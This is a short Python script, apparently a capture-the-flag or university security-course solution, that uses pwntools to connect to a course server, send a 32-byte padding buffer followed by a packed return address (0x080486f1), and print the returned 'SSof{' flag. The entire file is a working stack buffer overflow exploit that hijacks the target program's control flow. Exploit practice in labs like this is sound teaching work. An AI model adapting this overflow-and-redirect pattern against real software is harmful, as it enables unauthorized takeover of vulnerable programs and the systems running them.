from pwn import remote, p32

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23153

remote = remote(SERVER, PORT, timeout=10000)

buffer = b"a" * 32 + p32(0x080486f1)

remote.recvline()
remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof{")
print(flag.decode())